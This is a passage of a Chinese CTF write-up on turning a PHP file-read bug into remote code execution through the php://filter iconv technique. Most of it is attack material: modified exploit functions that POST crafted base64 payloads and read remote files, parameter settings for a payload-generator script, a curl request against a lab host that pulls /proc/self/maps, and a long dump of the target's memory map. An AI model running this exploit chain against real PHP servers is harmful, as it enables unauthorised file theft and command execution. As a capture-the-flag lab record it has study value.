<p>在这⾥只需要修改(如果我没记错的话)send函数（请求包的参数设置），download函数（内容的正则匹 配），将check_vulnerable函数中的部分failure函数的调⽤换成pass（使⽤时，会吞字符，但不影响漏 洞利⽤。具体原因笔者太菜，不清楚），即可正常运⾏脚本。</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Response<span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
            self<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
            params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span> path<span class="token punctuation">}</span><span class="token punctuation">,</span>
            data<span class="token operator">=</span><span class="token punctuation">{</span>
                <span class="token string">"a"</span><span class="token punctuation">:</span> b64decode<span class="token punctuation">(</span><span class="token string">"cHN5Y2hvCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFetWq88ihNWtZYYbaXqMoFf+9kkIi+P1ESiN3ZYuAjXbSzg1ExS1/tvEHQZAoJ9eyubdAX/bK6NRfQfhDyuAQ+bEtSBpUr5SA95RSrcK7G0D95jQ0DaMjmLwwB/i19oxtOLZDivhXwUdwbCOkO8DBv9u5jOFs63tjrzmbU5+f/C"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">"b"</span><span class="token punctuation">:</span> b64decode<span class="token punctuation">(</span><span class="token string">"cHN5Y2hvCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFetWq88ihNWtZYYbaXqMoFf+9mkIi+P1ESiN3ZYuAjXbSzg1ExS1/tvEHQZAgJ+eyubdAX/bK6NRfQfBDyuAQ+bEtSBpUr5SA95RSrcK7G0D95jw0DaMjmLwwB/i19oxtOLZDivhXwUdwbCOkM8DBv9u5jOFs63tjrzmTU5+f/C"</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span>
        <span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.
        """</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span>
        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"&lt;\/code&gt;([\s\S]*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@entry</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>
    <span class="token string">"pad"</span><span class="token punctuation">,</span>
    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>
    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>kezibei脚本</p>
<p><a target="_blank" rel="noopener" href="https://github.com/kezibei/php-filter-iconv">https://github.com/kezibei/php-filter-iconv</a>  该脚本只要当前⽬录中有⽬标靶机的/proc/self/maps和libc.so⽂件，即可将payload跑出来，让我们⾃ ⼰去运⾏。 payload会随着当前maps的变化⽽变化，因此payload并不是固定的</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/kezibei/php-filter-iconv?tab=readme-ov-file">https://github.com/kezibei/php-filter-iconv?tab=readme-ov-file</a></p>
<p><a target="_blank" rel="noopener" href="https://xyaxxya.github.io/posts/2b7eb6e9.html#ez-readfile">https://xyaxxya.github.io/posts/2b7eb6e9.html#ez-readfile</a></p>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/11874">https://www.nssctf.cn/note/set/11874</a></p>
<blockquote>
<p>通过任意文件下载获取目标的/proc/self/maps和libc-2.x.so，在本机和php-filter-iconv.py放在同目录，然后运行脚本即可生成php://filter/的RCE payload，详细参数调整如下代码即可。</p>
<p>…….<br>maps_path = ‘./maps’<br>cmd = ‘echo 123 &gt; 1.txt’<br>sleep_time = 1<br>padding = 20</p>
<p>if not os.path.exists(maps_path):<br>    exit(“[-]no maps file”)</p>
<p>regions = get_regions(maps_path)<br>heap, libc_info = get_symbols_and_addresses(regions)</p>
<p>libc_path = libc_info.path<br>print(“[*]download: “+libc_path)</p>
<p>libc_path = ‘./libc-2.23.so’<br>…….</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node1.anna.nssctf.cn:28468/?file=/proc/self/maps -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">55d9ac153000-55d9ac18b000 r--p 00000000 00:39 2658390                    /usr/sbin/apache2
55d9ac18b000-55d9ac1da000 r-xp 00038000 00:39 2658390                    /usr/sbin/apache2
55d9ac1da000-55d9ac1fe000 r--p 00087000 00:39 2658390                    /usr/sbin/apache2
55d9ac1fe000-55d9ac202000 r--p 000aa000 00:39 2658390                    /usr/sbin/apache2
55d9ac202000-55d9ac206000 rw-p 000ae000 00:39 2658390                    /usr/sbin/apache2
55d9ac206000-55d9ac20a000 rw-p 00000000 00:00 0
55d9ad330000-55d9ad4f9000 rw-p 00000000 00:00 0                          [heap]
7fce5d8fd000-7fce5d8fe000 r--p 00000000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.1
7fce5d8fe000-7fce5d8ff000 r-xp 00001000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.1
7fce5d8ff000-7fce5f414000 r--p 00002000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.1
7fce5f414000-7fce5f415000 r--p 01b16000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.1
7fce5f415000-7fce5f416000 rw-p 01b17000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.1
7fce5f416000-7fce5f45a000 rw-p 00000000 00:00 0
7fce5f45a000-7fce5f45d000 r--p 00000000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so
7fce5f45d000-7fce5f464000 r-xp 00003000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so
7fce5f464000-7fce5f466000 r--p 0000a000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so
7fce5f466000-7fce5f467000 r--p 0000b000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so
7fce5f467000-7fce5f468000 rw-p 0000c000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so
7fce5f468000-7fce5f49e000 rw-p 00000000 00:00 0
7fce5f4a6000-7fce5f4a8000 rw-p 00000000 00:00 0
7fce5f4ae000-7fce5f4b0000 rw-p 00000000 00:00 0
7fce5fd60000-7fce5fd63000 r--p 00000000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7fce5fd63000-7fce5fd74000 r-xp 00003000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7fce5fd74000-7fce5fd78000 r--p 00014000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7fce5fd78000-7fce5fd79000 r--p 00017000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7fce5fd79000-7fce5fd7a000 rw-p 00018000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7fce5fd7a000-7fce5fe10000 r--p 00000000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
7fce5fe10000-7fce5feec000 r-xp 00096000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
7fce5feec000-7fce5ff36000 r--p 00172000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
7fce5ff36000-7fce5ff41000 r--p 001bb000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
7fce5ff41000-7fce5ff44000 rw-p 001c6000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
7fce5ff44000-7fce5ff47000 rw-p 00000000 00:00 0
7fce60e00000-7fce61000000 rw-p 00000000 00:00 0
7fce61054000-7fce610d5000 rw-p 00000000 00:00 0
7fce610d5000-7fce610e1000 r--p 00000000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.0
7fce610e1000-7fce6111a000 r-xp 0000c000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.0
7fce6111a000-7fce6112c000 r--p 00045000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.0
7fce6112c000-7fce6112d000 ---p 00057000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.0
7fce6112d000-7fce6112e000 r--p 00057000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.0
7fce6112e000-7fce6112f000 rw-p 00058000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.0
7fce6112f000-7fce61246000 r--p 00000000 00:39 2659069                    /usr/lib/apache2/modules/libphp7.so
7fce61246000-7fce615fd000 r-xp 00117000 00:39 2659069                    /usr/lib/apache2/modules/libphp7.so
7fce615fd000-7fce61de1000 r--p 004ce000 00:39 2659069                    /usr/lib/apache2/modules/libphp7.so
7fce61de1000-7fce61de2000 ---p 00cb2000 00:39 2659069                    /usr/lib/apache2/modules/libphp7.so
7fce61de2000-7fce61e89000 r--p 00cb2000 00:39 2659069                    /usr/lib/apache2/modules/libphp7.so
7fce61e89000-7fce61e98000 rw-p 00d59000 00:39 2659069                    /usr/lib/apache2/modules/libphp7.so
7fce61e98000-7fce61eb9000 rw-p 00000000 00:00 0
7fce61eb9000-7fce61f3f000 r--p 00000000 00:39 2651243                    /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7fce61f3f000-7fce620e6000 r-xp 00086000 00:39 2651243                    /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7fce620e6000-7fce62176000 r--p 0022d000 00:39 2651243                    /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7fce62176000-7fce62177000 ---p 002bd000 00:39 2651243                    /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7fce62177000-7fce621a7000 r--p 002bd000 00:39 2651243                    /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7fce621a7000-7fce621a9000 rw-p 002ed000 00:39 2651243                    /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7fce621a9000-7fce621ad000 rw-p 00000000 00:00 0
7fce621ad000-7fce621ca000 r--p 00000000 00:39 2651286                    /usr/lib/x86_64-linux-gnu/libssl.so.1.1
7fce621ca000-7fce62218000 r-xp 0001d000 00:39 2651286                    /usr/lib/x86_64-linux-gnu/libssl.so.1.1
7fce62218000-7fce62232000 r--p 0006b000 00:39 2651286                    /usr/lib/x86_64-linux-gnu/libssl.so.1.1
7fce62232000-7fce62233000 ---p 00085000 00:39 2651286                    /usr/lib/x86_64-linux-gnu/libssl.so.1.1
7fce62233000-7fce6223c000 r--p 00085000 00:39 2651286                    /usr/lib/x86_64-linux-gnu/libssl.so.1.1
7fce6223c000-7fce62240000 rw-p 0008e000 00:39 2651286                    /usr/lib/x86_64-linux-gnu/libssl.so.1.1
7fce62251000-7fce62257000 rw-p 00000000 00:00 0
7fce62257000-7fce6226f000 rw-s 00000000 00:01 1535                       /dev/zero (deleted)
7fce6226f000-7fce62274000 r--p 00000000 00:39 2659608                    /usr/local/lib/php/extensions/no-debug-non-zts-20180731/sodium.so
7fce62274000-7fce6227c000 r-xp 00005000 00:39 2659608                    /usr/local/lib/php/extensions/no-debug-non-zts-20180731/sodium.so
7fce6227c000-7fce62281000 r--p 0000d000 00:39 2659608                    /usr/local/lib/php/extensions/no-debug-non-zts-20180731/sodium.so
7fce62281000-7fce62282000 ---p 00012000 00:39 2659608                    /usr/local/lib/php/extensions/no-debug-non-zts-20180731/sodium.so
7fce62282000-7fce62284000 r--p 00012000 00:39 2659608                    /usr/local/lib/php/extensions/no-debug-non-zts-20180731/sodium.so
7fce62284000-7fce62285000 rw-p 00014000 00:39 2659608                    /usr/local/lib/php/extensions/no-debug-non-zts-20180731/sodium.so
7fce62285000-7fce622a6000 rw-p 00000000 00:00 0
7fce622a6000-7fce622a9000 r--p 00000000 00:39 2658299                    /usr/lib/apache2/modules/mod_rewrite.so
7fce622a9000-7fce622b4000 r-xp 00003000 00:39 2658299                    /usr/lib/apache2/modules/mod_rewrite.so
7fce622b4000-7fce622b8000 r--p 0000e000 00:39 2658299                    /usr/lib/apache2/modules/mod_rewrite.so
7fce622b8000-7fce622b9000 r--p 00011000 00:39 2658299                    /usr/lib/apache2/modules/mod_rewrite.so
7fce622b9000-7fce622ba000 rw-p 00012000 00:39 2658299                    /usr/lib/apache2/modules/mod_rewrite.so
7fce622ba000-7fce622e5000 r--p 00000000 00:39 2651276                    /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
7fce622e5000-7fce6237d000 r-xp 0002b000 00:39 2651276                    /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
7fce6237d000-7fce623d9000 r--p 000c3000 00:39 2651276                    /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
7fce623d9000-7fce623e4000 r--p 0011e000 00:39 2651276                    /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
7fce623e4000-7fce623ee000 rw-p 00129000 00:39 2651276                    /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
7fce623ee000-7fce623fd000 r--p 00000000 00:39 2650533                    /lib/x86_64-linux-gnu/libm-2.31.so
7fce623fd000-7fce62497000 r-xp 0000f000 00:39 2650533                    /lib/x86_64-linux-gnu/libm-2.31.so
7fce62497000-7fce62530000 r--p 000a9000 00:39 2650533                    /lib/x86_64-linux-gnu/libm-2.31.so
7fce62530000-7fce62531000 r--p 00141000 00:39 2650533                    /lib/x86_64-linux-gnu/libm-2.31.so
7fce62531000-7fce62532000 rw-p 00142000 00:39 2650533                    /lib/x86_64-linux-gnu/libm-2.31.so
7fce62532000-7fce62534000 rw-p 00000000 00:00 0
7fce62534000-7fce62535000 r--p 00000000 00:39 2658314                    /usr/lib/apache2/modules/mod_status.so
7fce62535000-7fce62538000 r-xp 00001000 00:39 2658314                    /usr/lib/apache2/modules/mod_status.so
7fce62538000-7fce6253a000 r--p 00004000 00:39 2658314                    /usr/lib/apache2/modules/mod_status.so
7fce6253a000-7fce6253b000 r--p 00005000 00:39 2658314                    /usr/lib/apache2/modules/mod_status.so
7fce6253b000-7fce6253c000 rw-p 00006000 00:39 2658314                    /usr/lib/apache2/modules/mod_status.so
7fce6253c000-7fce6253d000 r--p 00000000 00:39 2658305                    /usr/lib/apache2/modules/mod_setenvif.so
7fce6253d000-7fce6253f000 r-xp 00001000 00:39 2658305                    /usr/lib/apache2/modules/mod_setenvif.so
7fce6253f000-7fce62540000 r--p 00003000 00:39 2658305                    /usr/lib/apache2/modules/mod_setenvif.so
7fce62540000-7fce62541000 r--p 00003000 00:39 2658305                    /usr/lib/apache2/modules/mod_setenvif.so
7fce62541000-7fce62542000 rw-p 00004000 00:39 2658305                    /usr/lib/apache2/modules/mod_setenvif.so
7fce62542000-7fce62543000 r--p 00000000 00:39 2658297                    /usr/lib/apache2/modules/mod_reqtimeout.so
7fce62543000-7fce62545000 r-xp 00001000 00:39 2658297                    /usr/lib/apache2/modules/mod_reqtimeout.so
7fce62545000-7fce62546000 r--p 00003000 00:39 2658297                    /usr/lib/apache2/modules/mod_reqtimeout.so
7fce62546000-7fce62547000 r--p 00003000 00:39 2658297                    /usr/lib/apache2/modules/mod_reqtimeout.so
7fce62547000-7fce62548000 rw-p 00004000 00:39 2658297                    /usr/lib/apache2/modules/mod_reqtimeout.so
7fce62548000-7fce6254a000 r--p 00000000 00:39 2651248                    /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
7fce6254a000-7fce62550000 r-xp 00002000 00:39 2651248                    /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
7fce62550000-7fce62552000 r--p 00008000 00:39 2651248                    /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
7fce62552000-7fce62553000 r--p 00009000 00:39 2651248                    /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
7fce62553000-7fce62554000 rw-p 0000a000 00:39 2651248                    /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
7fce62554000-7fce62556000 r--p 00000000 00:39 2650530                    /lib/x86_64-linux-gnu/libkeyutils.so.1.9
7fce62556000-7fce62558000 r-xp 00002000 00:39 2650530                    /lib/x86_64-linux-gnu/libkeyutils.so.1.9
7fce62558000-7fce62559000 r--p 00004000 00:39 2650530                    /lib/x86_64-linux-gnu/libkeyutils.so.1.9
7fce62559000-7fce6255a000 r--p 00004000 00:39 2650530                    /lib/x86_64-linux-gnu/libkeyutils.so.1.9
7fce6255a000-7fce6255b000 rw-p 00005000 00:39 2650530                    /lib/x86_64-linux-gnu/libkeyutils.so.1.9
7fce6255b000-7fce6255f000 r--p 00000000 00:39 2650528                    /lib/x86_64-linux-gnu/libgpg-error.so.0.29.0
7fce6255f000-7fce62574000 r-xp 00004000 00:39 2650528                    /lib/x86_64-linux-gnu/libgpg-error.so.0.29.0
7fce62574000-7fce6257e000 r--p 00019000 00:39 2650528                    /lib/x86_64-linux-gnu/libgpg-error.so.0.29.0
7fce6257e000-7fce6257f000 ---p 00023000 00:39 2650528                    /lib/x86_64-linux-gnu/libgpg-error.so.0.29.0
7fce6257f000-7fce62580000 r--p 00023000 00:39 2650528                    /lib/x86_64-linux-gnu/libgpg-error.so.0.29.0
7fce62580000-7fce62581000 rw-p 00024000 00:39 2650528                    /lib/x86_64-linux-gnu/libgpg-error.so.0.29.0
7fce62581000-7fce62584000 r--p 00000000 00:39 2651292                    /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
7fce62584000-7fce62590000 r-xp 00003000 00:39 2651292                    /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
7fce62590000-7fce62594000 r--p 0000f000 00:39 2651292                    /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
7fce62594000-7fce62595000 ---p 00013000 00:39 2651292                    /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
7fce62595000-7fce62596000 r--p 00013000 00:39 2651292                    /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
7fce62596000-7fce62597000 rw-p 00014000 00:39 2651292                    /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
7fce62597000-7fce62598000 r--p 00000000 00:39 2752815                    /usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.0.9
7fce62598000-7fce62599000 r-xp 00001000 00:39 2752815                    /usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.0.9
7fce62599000-7fce625b8000 r--p 00002000 00:39 2752815                    /usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.0.9
7fce625b8000-7fce625b9000 r--p 00020000 00:39 2752815                    /usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.0.9
7fce625b9000-7fce625ba000 rw-p 00021000 00:39 2752815                    /usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.0.9
7fce625ba000-7fce625bd000 r--p 00000000 00:39 2752899                    /usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25
7fce625bd000-7fce625cf000 r-xp 00003000 00:39 2752899                    /usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25
7fce625cf000-7fce625d5000 r--p 00015000 00:39 2752899                    /usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25
7fce625d5000-7fce625d6000 r--p 0001a000 00:39 2752899                    /usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25
7fce625d6000-7fce625d7000 rw-p 0001b000 00:39 2752899                    /usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25
7fce625d7000-7fce625da000 r--p 00000000 00:39 2651266                    /usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1
7fce625da000-7fce625e1000 r-xp 00003000 00:39 2651266                    /usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1
7fce625e1000-7fce625e4000 r--p 0000a000 00:39 2651266                    /usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1
7fce625e4000-7fce625e5000 r--p 0000c000 00:39 2651266                    /usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1
7fce625e5000-7fce625e6000 rw-p 0000d000 00:39 2651266                    /usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1
7fce625e6000-7fce625ea000 r--p 00000000 00:39 2651262                    /usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1
7fce625ea000-7fce62605000 r-xp 00004000 00:39 2651262                    /usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1
7fce62605000-7fce62612000 r--p 0001f000 00:39 2651262                    /usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1
7fce62612000-7fce62613000 ---p 0002c000 00:39 2651262                    /usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1
7fce62613000-7fce62614000 r--p 0002c000 00:39 2651262                    /usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1
7fce62614000-7fce62615000 rw-p 0002d000 00:39 2651262                    /usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1
7fce62615000-7fce62616000 rw-p 00000000 00:00 0
7fce62616000-7fce62639000 r--p 00000000 00:39 2651264                    /usr/lib/x86_64-linux-gnu/libkrb5.so.3.3
7fce62639000-7fce62697000 r-xp 00023000 00:39 2651264                    /usr/lib/x86_64-linux-gnu/libkrb5.so.3.3
7fce62697000-7fce626df000 r--p 00081000 00:39 2651264                    /usr/lib/x86_64-linux-gnu/libkrb5.so.3.3
7fce626df000-7fce626ed000 r--p 000c8000 00:39 2651264                    /usr/lib/x86_64-linux-gnu/libkrb5.so.3.3
7fce626ed000-7fce626f0000 rw-p 000d6000 00:39 2651264                    /usr/lib/x86_64-linux-gnu/libkrb5.so.3.3
7fce626f0000-7fce626f4000 rw-p 00000000 00:00 0
7fce626f4000-7fce626f6000 r--p 00000000 00:39 2650517                    /lib/x86_64-linux-gnu/libcom_err.so.2.1
7fce626f6000-7fce626f7000 r-xp 00002000 00:39 2650517                    /lib/x86_64-linux-gnu/libcom_err.so.2.1
7fce626f7000-7fce626f8000 r--p 00003000 00:39 2650517                    /lib/x86_64-linux-gnu/libcom_err.so.2.1
7fce626f8000-7fce626f9000 r--p 00003000 00:39 2650517                    /lib/x86_64-linux-gnu/libcom_err.so.2.1
7fce626f9000-7fce626fa000 rw-p 00004000 00:39 2650517                    /lib/x86_64-linux-gnu/libcom_err.so.2.1
7fce626fa000-7fce62706000 r--p 00000000 00:39 2651250                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.8
7fce62706000-7fce627d6000 r-xp 0000c000 00:39 2651250                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.8
7fce627d6000-7fce62813000 r--p 000dc000 00:39 2651250                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.8
7fce62813000-7fce62815000 r--p 00118000 00:39 2651250                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.8
7fce62815000-7fce6281a000 rw-p 0011a000 00:39 2651250                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.8
7fce6281a000-7fce62825000 r--p 00000000 00:39 2651252                    /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.1
7fce62825000-7fce62881000 r-xp 0000b000 00:39 2651252                    /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.1
7fce62881000-7fce62898000 r--p 00067000 00:39 2651252                    /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.1
7fce62898000-7fce62899000 ---p 0007e000 00:39 2651252                    /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.1
7fce62899000-7fce6289a000 r--p 0007e000 00:39 2651252                    /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.1
7fce6289a000-7fce6289b000 rw-p 0007f000 00:39 2651252                    /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.1
7fce6289b000-7fce628a7000 r--p 00000000 00:39 2651272                    /usr/lib/x86_64-linux-gnu/libnettle.so.8.4
7fce628a7000-7fce628c9000 r-xp 0000c000 00:39 2651272                    /usr/lib/x86_64-linux-gnu/libnettle.so.8.4
7fce628c9000-7fce628df000 r--p 0002e000 00:39 2651272                    /usr/lib/x86_64-linux-gnu/libnettle.so.8.4
7fce628df000-7fce628e0000 ---p 00044000 00:39 2651272                    /usr/lib/x86_64-linux-gnu/libnettle.so.8.4
7fce628e0000-7fce628e2000 r--p 00044000 00:39 2651272                    /usr/lib/x86_64-linux-gnu/libnettle.so.8.4
7fce628e2000-7fce628e3000 rw-p 00046000 00:39 2651272                    /usr/lib/x86_64-linux-gnu/libnettle.so.8.4
7fce628e3000-7fce628ec000 r--p 00000000 00:39 2651258                    /usr/lib/x86_64-linux-gnu/libhogweed.so.6.4
7fce628ec000-7fce628ff000 r-xp 00009000 00:39 2651258                    /usr/lib/x86_64-linux-gnu/libhogweed.so.6.4
7fce628ff000-7fce62929000 r--p 0001c000 00:39 2651258                    /usr/lib/x86_64-linux-gnu/libhogweed.so.6.4
7fce62929000-7fce6292a000 ---p 00046000 00:39 2651258                    /usr/lib/x86_64-linux-gnu/libhogweed.so.6.4
7fce6292a000-7fce6292b000 r--p 00046000 00:39 2651258                    /usr/lib/x86_64-linux-gnu/libhogweed.so.6.4
7fce6292b000-7fce6292c000 rw-p 00047000 00:39 2651258                    /usr/lib/x86_64-linux-gnu/libhogweed.so.6.4
7fce6292c000-7fce62960000 r--p 00000000 00:39 2651254                    /usr/lib/x86_64-linux-gnu/libgnutls.so.30.29.1
7fce62960000-7fce62a81000 r-xp 00034000 00:39 2651254                    /usr/lib/x86_64-linux-gnu/libgnutls.so.30.29.1
7fce62a81000-7fce62b17000 r--p 00155000 00:39 2651254                    /usr/lib/x86_64-linux-gnu/libgnutls.so.30.29.1
7fce62b17000-7fce62b28000 r--p 001ea000 00:39 2651254                    /usr/lib/x86_64-linux-gnu/libgnutls.so.30.29.1
7fce62b28000-7fce62b2a000 rw-p 001fb000 00:39 2651254                    /usr/lib/x86_64-linux-gnu/libgnutls.so.30.29.1
7fce62b2a000-7fce62b2c000 rw-p 00000000 00:00 0
7fce62b2c000-7fce62b3d000 r--p 00000000 00:39 2651298                    /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0
